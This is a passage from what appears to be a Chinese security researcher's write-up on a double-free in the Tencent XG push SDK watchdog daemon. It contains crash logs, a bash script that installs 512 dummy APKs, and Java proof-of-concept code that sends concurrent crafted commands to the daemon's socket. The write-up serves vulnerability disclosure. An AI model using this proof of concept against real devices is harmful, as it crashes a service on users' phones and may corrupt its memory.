I/TpnsWatchdog(&nbsp;&nbsp;495):&nbsp;try&nbsp;to&nbsp;add&nbsp;to&nbsp;the&nbsp;unstall&nbsp;list
F/libc&nbsp;&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;495):&nbsp;invalid&nbsp;address&nbsp;or&nbsp;address&nbsp;of&nbsp;corrupt&nbsp;block&nbsp;0x4125f850&nbsp;passed&nbsp;to&nbsp;dlfree
F/libc&nbsp;&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;495):&nbsp;Fatal&nbsp;signal&nbsp;11&nbsp;(SIGSEGV)&nbsp;at&nbsp;0xdeadbaad&nbsp;(code=1),&nbsp;thread&nbsp;495&nbsp;(xg_watchdog)
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;Build&nbsp;fingerprint:&nbsp;‘google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys’
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;Revision:&nbsp;’11’
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;pid:&nbsp;495,&nbsp;tid:&nbsp;495,&nbsp;name:&nbsp;xg_watchdog&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;/data/data/com.tencent.wework/lib/libtpnsWatchdog.so&nbsp;&lt;&lt;&lt;
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;AM&nbsp;write&nbsp;failure&nbsp;(32&nbsp;/&nbsp;Broken&nbsp;pipe)
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;signal&nbsp;11&nbsp;(SIGSEGV),&nbsp;code&nbsp;1&nbsp;(SEGV_MAPERR),&nbsp;fault&nbsp;addr&nbsp;deadbaad
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;Abort&nbsp;message:&nbsp;‘invalid&nbsp;address&nbsp;or&nbsp;address&nbsp;of&nbsp;corrupt&nbsp;block&nbsp;0x4125f850&nbsp;passed&nbsp;to&nbsp;dlfree’
W/NativeCrashListener(&nbsp;&nbsp;960):&nbsp;Couldn’t&nbsp;find&nbsp;ProcessRecord&nbsp;for&nbsp;pid&nbsp;495
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r0&nbsp;00000000&nbsp;&nbsp;r1&nbsp;40139c5e&nbsp;&nbsp;r2&nbsp;deadbaad&nbsp;&nbsp;r3&nbsp;4013d7a0
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r4&nbsp;4125f850&nbsp;&nbsp;r5&nbsp;40148180&nbsp;&nbsp;r6&nbsp;4121c000&nbsp;&nbsp;r7&nbsp;4125f858
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r8&nbsp;400cc0d9&nbsp;&nbsp;r9&nbsp;00000000&nbsp;&nbsp;sl&nbsp;00000000&nbsp;&nbsp;fp&nbsp;bee458ec
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip&nbsp;00000001&nbsp;&nbsp;sp&nbsp;bee41710&nbsp;&nbsp;lr&nbsp;4010b6cb&nbsp;&nbsp;pc&nbsp;4010b6cc&nbsp;&nbsp;cpsr&nbsp;600f0030
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d0&nbsp;&nbsp;2064657373617064&nbsp;&nbsp;d1&nbsp;&nbsp;6120726f2073736c
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d2&nbsp;&nbsp;6f20737365726466&nbsp;&nbsp;d3&nbsp;&nbsp;707572726f632072
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d4&nbsp;&nbsp;2e2f2e2f2e2f2e2f&nbsp;&nbsp;d5&nbsp;&nbsp;2e2f2e2f2e2f2e2f
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d6&nbsp;&nbsp;2e2f2e2f2e2f2e2f&nbsp;&nbsp;d7&nbsp;&nbsp;2e2f2e2f2e2f2e2f
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d8&nbsp;&nbsp;0000000000000000&nbsp;&nbsp;d9&nbsp;&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d10&nbsp;0000000000000000&nbsp;&nbsp;d11&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d12&nbsp;0000000000000000&nbsp;&nbsp;d13&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d14&nbsp;0000000000000000&nbsp;&nbsp;d15&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d16&nbsp;41c3183f70f5e354&nbsp;&nbsp;d17&nbsp;3f50624dd2f1a9fc
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d18&nbsp;41c05bc240800000&nbsp;&nbsp;d19&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d20&nbsp;0000000000000000&nbsp;&nbsp;d21&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d22&nbsp;0000000000000000&nbsp;&nbsp;d23&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d24&nbsp;0000000000000000&nbsp;&nbsp;d25&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d26&nbsp;0000000000000000&nbsp;&nbsp;d27&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d28&nbsp;0000000000000000&nbsp;&nbsp;d29&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d30&nbsp;0000000000000000&nbsp;&nbsp;d31&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;scr&nbsp;00000010
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;backtrace:
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#00&nbsp;&nbsp;pc&nbsp;000116cc&nbsp;&nbsp;/system/lib/libc.so&nbsp;(dlfree+1191)
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#01&nbsp;&nbsp;pc&nbsp;0000dc0b&nbsp;&nbsp;/system/lib/libc.so&nbsp;(free+10)
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#02&nbsp;&nbsp;pc&nbsp;000016b5&nbsp;&nbsp;/data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#03&nbsp;&nbsp;pc&nbsp;00002787&nbsp;&nbsp;/data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#04&nbsp;&nbsp;pc&nbsp;0000124f&nbsp;&nbsp;/data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#05&nbsp;&nbsp;pc&nbsp;0000e34b&nbsp;&nbsp;/system/lib/libc.so&nbsp;(__libc_init+50)
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;241):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#06&nbsp;&nbsp;pc&nbsp;00001390&nbsp;&nbsp;/data/app-lib/com.tencent.wework-1/libtpnsWatchdog.so
I</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">为什么513、514不能触发呢？这个问题一直没有分析得很清楚，因此也没有选择提交，直至厂商对前面两个漏洞进行修复，再次复现这个漏洞的难度加大。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"></span></p><pre class="brush:bash;toolbar:false">if&nbsp;(&nbsp;v18&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
j_j__ZdaPv:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;operator&nbsp;delete[](v18);&nbsp;&nbsp;
}</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">再次观察漏洞的触发位置，可以发现v18 被delete后并没有置为null，那么有没有可能v18会被delete多次呢？作为socket服务daemon，程序使用了epoll系统调用，因此可以猜想这是并发处理的原因。在没有并发的情况下依次传入要添加的xgappinfo，在超过512个xgappinfo时，循环直接跳出，不会尝试添加这个xgappinfo，不会触及到下面delete所在的分支，这也是很长时间我通过调试很难复现该漏洞的原因。但如果存在并发，特别是在即将超过512个xgappinfo时，又传入了多个要添加的xgappinfo，那么由于并发处理，程序会同时尝试添加多个xgappinfo且不会认为超过了512个xgappinfo，此时v18均指向同一地址（即第512个对象中在堆上分配的packagename的地址），那么在v18被delete一次的情况下，紧接着会再次delete一下，从而导致delete出错。</span></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><br/></span></strong></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">0x06 后续</span></strong></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">腾讯很快对命令注入和空指针解引用引发的远程拒绝服务漏洞进行了修复，主要修复点包括：</span><br/></p><ul style="box-sizing: inherit; border: 0px; font-family: inherit; font-style: inherit; font-weight: inherit; margin-bottom: 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; list-style-position: initial; list-style-image: initial;" class=" list-paddingleft-2"><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">1. Socket端口监听任意地址改为监听本地地址。</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">2. 对Socket端口传入的命令进行了加密。</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">3. 对传入xgapplist中的packagename进行了过滤，特别是过滤了“／”字符，防止目录穿越。</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这些防御措施导致我很难再复现最后一个堆内存破坏漏洞了，但通过深入分析，我们仍然可以通过：</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">1. 编写手机上运行的本地代码</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2. 添加手机上已存在的packagename，要超过512个</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">3. 破解加密算法</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">来予以一一破解。首先，在手机上安装512个packganame(Oh my god! )，这个可以通过脚本解决。</span></p></li></ul><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"></span></p><pre class="brush:bash;toolbar:false">#!/bin/bash
#&nbsp;Generate&nbsp;512&nbsp;apks,&nbsp;Build&nbsp;and&nbsp;Install
CURDIR=$(pwd)
for&nbsp;i&nbsp;in&nbsp;$(seq&nbsp;512)
do
&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;$CURDIR
&nbsp;&nbsp;&nbsp;&nbsp;DIR=”HelloWorld”$i
&nbsp;&nbsp;&nbsp;&nbsp;PACKAGE=”com.ms509.helloworld”$i
&nbsp;&nbsp;&nbsp;&nbsp;UNSIGNED_APK=$DIR”-release-unsigned.apk”
&nbsp;&nbsp;&nbsp;&nbsp;SIGNED_APK=$i”.apk”
&nbsp;&nbsp;&nbsp;&nbsp;android&nbsp;create&nbsp;project&nbsp;-n&nbsp;$DIR&nbsp;-t&nbsp;13&nbsp;-p&nbsp;$DIR&nbsp;-k&nbsp;$PACKAGE&nbsp;-a&nbsp;helloworld
&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;$CURDIR”/”$DIR
&nbsp;&nbsp;&nbsp;&nbsp;ant&nbsp;release
&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;$CURDIR”/”$DIR”/bin”
#&nbsp;sign&nbsp;apk
&nbsp;&nbsp;&nbsp;&nbsp;signapk.sh&nbsp;$UNSIGNED_APK&nbsp;$SIGNED_APK
&nbsp;&nbsp;&nbsp;&nbsp;adb&nbsp;install&nbsp;$SIGNED_APK
done</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">其次，破解加密算法可以直接调用程序使用的加解密库，而不必真的破解。最后的POC关键代码如下，注意，我们在快超过512时sleep了一下，使XG SDK的处理能力跟上，然后后面再传入多个xgappinfo，这样有更大的几率触发并发。</span></p><pre class="brush:bash;toolbar:false;"><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">directSendContent(&quot;debug:1&quot;);<br style="text-align: left;"/>directSendContent(&quot;ver:&quot;);<br style="text-align: left;"/>Log.d(&quot;testXG&quot;, &quot;[+] Adding &quot;+Integer.toString(m_appNameList.size()) + &quot;fake xg apps&quot;);<br style="text-align: left;"/>int i = 0;<br style="text-align: left;"/>for (String xgapp:m_appNameList) {<br style="text-align: left;"/>&nbsp;&nbsp;&nbsp; if ((i++) &gt; 530)<br style="text-align: left;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br style="text-align: left;"/>&nbsp;&nbsp;&nbsp; String cmd = &quot;xgapplist:&quot; + xgapp + &quot;,&quot; +<br style="text-align: left;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Integer.toString((int)(Math.random()*1000000)) + &quot;;&quot;;<br style="text-align: left;"/>&nbsp;&nbsp;&nbsp; Log.d(&quot;testXG&quot;, &quot;[+] &quot; + Integer.toString(i) + &quot; Sending command: &quot; + cmd);<br style="text-align: left;"/>&nbsp;&nbsp;&nbsp; if (i == 510) {<br style="text-align: left;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try {<br style="text-align: left;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sleep(1000);<br style="text-align: left;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch (InterruptedException e){<br style="text-align: left;"/><br style="text-align: left;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br style="text-align: left;"/>&nbsp;&nbsp;&nbsp; }<br style="text-align: left;"/>&nbsp;&nbsp;&nbsp; directSendContent(cmd);<br style="text-align: left;"/></span></p></pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"></span></p><pre class="brush:bash;toolbar:false">Logcat:
I/xguardian(19448):&nbsp;scanAppStatus&nbsp;node:508,&nbsp;pkg:heenstudy.com.sniffclipboard,&nbsp;accid:917429,&nbsp;status:1
I/xguardian(19448):&nbsp;scanAppStatus&nbsp;node:509,&nbsp;pkg:com.estrongs.android.taskmanager,&nbsp;accid:230582,&nbsp;status:1
I/xguardian(19448):&nbsp;scanAppStatus&nbsp;node:510,&nbsp;pkg:com.ilegendsoft.mercury,&nbsp;accid:995063,&nbsp;status:1
I/xguardian(19448):&nbsp;scanAppStatus&nbsp;node:511,&nbsp;pkg:fq.router2,&nbsp;accid:619048,&nbsp;status:1
I/xguardian(19448):&nbsp;xg&nbsp;app&nbsp;list&nbsp;size&nbsp;total:512,&nbsp;xgAppsCacheCount:512,&nbsp;xgAppsCacheActivityStatusCount:512
I/xguardian(19448):&nbsp;countTimeout=0,&nbsp;wait_time=310000,&nbsp;nfds=1,&nbsp;xgAppsCacheCount=512
I/xguardian(19448):&nbsp;server&nbsp;accept&nbsp;client&nbsp;2,&nbsp;127.0.0.1
I/xguardian(19448):&nbsp;countTimeout=0,&nbsp;wait_time=310000,&nbsp;nfds=1,&nbsp;xgAppsCacheCount=512
I/xguardian(19448):&nbsp;server&nbsp;decrpty&nbsp;receive&nbsp;from&nbsp;client:&nbsp;42&nbsp;:&nbsp;xgapplist:easyre.sjl.gossip.easyre,512970;
I/xguardian(19448):&nbsp;server&nbsp;get&nbsp;unstall&nbsp;appinfo:easyre.sjl.gossip.easyre,512970;
E/xguardian(19448):&nbsp;error&nbsp;accessid:512970
I/xguardian(19448):&nbsp;found&nbsp;0,&nbsp;pkgName:easyre.sjl.gossip.easyre,accid:512970
I/xguardian(19448):&nbsp;try&nbsp;to&nbsp;add&nbsp;to&nbsp;the&nbsp;unstall&nbsp;list
E/testXG&nbsp;&nbsp;(10149):&nbsp;[+]&nbsp;response:&nbsp;-1
F/libc&nbsp;&nbsp;&nbsp;&nbsp;(19448):&nbsp;invalid&nbsp;address&nbsp;or&nbsp;address&nbsp;of&nbsp;corrupt&nbsp;block&nbsp;0x401120c8&nbsp;passed&nbsp;to&nbsp;dlfree
F/libc&nbsp;&nbsp;&nbsp;&nbsp;(19448):&nbsp;Fatal&nbsp;signal&nbsp;11&nbsp;(SIGSEGV)&nbsp;at&nbsp;0xdeadbaad&nbsp;(code=1),&nbsp;thread&nbsp;19448&nbsp;(xg_watchdog)
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***&nbsp;***
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;Build&nbsp;fingerprint:&nbsp;‘google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys’
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;Revision:&nbsp;’11’
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;pid:&nbsp;19448,&nbsp;tid:&nbsp;19448,&nbsp;name:&nbsp;xg_watchdog&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;/data/data/com.qufenqi.android.quwallet/lib/libxguardian.so&nbsp;&lt;&lt;&lt;
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;signal&nbsp;11&nbsp;(SIGSEGV),&nbsp;code&nbsp;1&nbsp;(SEGV_MAPERR),&nbsp;fault&nbsp;addr&nbsp;deadbaad
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;AM&nbsp;write&nbsp;failure&nbsp;(32&nbsp;/&nbsp;Broken&nbsp;pipe)
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;Abort&nbsp;message:&nbsp;‘invalid&nbsp;address&nbsp;or&nbsp;address&nbsp;of&nbsp;corrupt&nbsp;block&nbsp;0x401120c8&nbsp;passed&nbsp;to&nbsp;dlfree’
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r0&nbsp;00000000&nbsp;&nbsp;r1&nbsp;400b5c5e&nbsp;&nbsp;r2&nbsp;deadbaad&nbsp;&nbsp;r3&nbsp;400b97a0
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r4&nbsp;401120c8&nbsp;&nbsp;r5&nbsp;400c4180&nbsp;&nbsp;r6&nbsp;4010e000&nbsp;&nbsp;r7&nbsp;401120d0
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r8&nbsp;40047221&nbsp;&nbsp;r9&nbsp;00000000&nbsp;&nbsp;sl&nbsp;00000000&nbsp;&nbsp;fp&nbsp;bec758dc
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip&nbsp;00000001&nbsp;&nbsp;sp&nbsp;bec6f6f8&nbsp;&nbsp;lr&nbsp;400876cb&nbsp;&nbsp;pc&nbsp;400876cc&nbsp;&nbsp;cpsr&nbsp;600f0030
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d0&nbsp;&nbsp;2064657373617064&nbsp;&nbsp;d1&nbsp;&nbsp;6f2073736572646c
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d2&nbsp;&nbsp;707572726f632066&nbsp;&nbsp;d3&nbsp;&nbsp;206b636f6c622072
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d4&nbsp;&nbsp;0000000000000000&nbsp;&nbsp;d5&nbsp;&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d6&nbsp;&nbsp;0000000000000000&nbsp;&nbsp;d7&nbsp;&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d8&nbsp;&nbsp;0000000000000000&nbsp;&nbsp;d9&nbsp;&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d10&nbsp;0000000000000000&nbsp;&nbsp;d11&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d12&nbsp;0000000000000000&nbsp;&nbsp;d13&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d14&nbsp;0000000000000000&nbsp;&nbsp;d15&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d16&nbsp;41c9ef5dd3bd0e56&nbsp;&nbsp;d17&nbsp;3f50624dd2f1a9fc
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d18&nbsp;41ba01d435000000&nbsp;&nbsp;d19&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d20&nbsp;0000000000000000&nbsp;&nbsp;d21&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d22&nbsp;0000000000000000&nbsp;&nbsp;d23&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d24&nbsp;0000000000000000&nbsp;&nbsp;d25&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d26&nbsp;0000000000000000&nbsp;&nbsp;d27&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d28&nbsp;0000000000000000&nbsp;&nbsp;d29&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d30&nbsp;0000000000000000&nbsp;&nbsp;d31&nbsp;0000000000000000
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;scr&nbsp;00000010
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;backtrace:
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#00&nbsp;&nbsp;pc&nbsp;000116cc&nbsp;&nbsp;/system/lib/libc.so&nbsp;(dlfree+1191)
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#01&nbsp;&nbsp;pc&nbsp;0000dc0b&nbsp;&nbsp;/system/lib/libc.so&nbsp;(free+10)
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#02&nbsp;&nbsp;pc&nbsp;000026e7&nbsp;&nbsp;/data/app-lib/com.qufenqi.android.quwallet-2/libxguardian.so
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#03&nbsp;&nbsp;pc&nbsp;00002ff7&nbsp;&nbsp;/data/app-lib/com.qufenqi.android.quwallet-2/libxguardian.so
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#04&nbsp;&nbsp;pc&nbsp;000013b1&nbsp;&nbsp;/data/app-lib/com.qufenqi.android.quwallet-2/libxguardian.so
I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#05&nbsp;&nbsp;pc&nbsp;0000e34b&nbsp;&nbsp;/system/lib/libc.so&nbsp;(__libc_init+50)
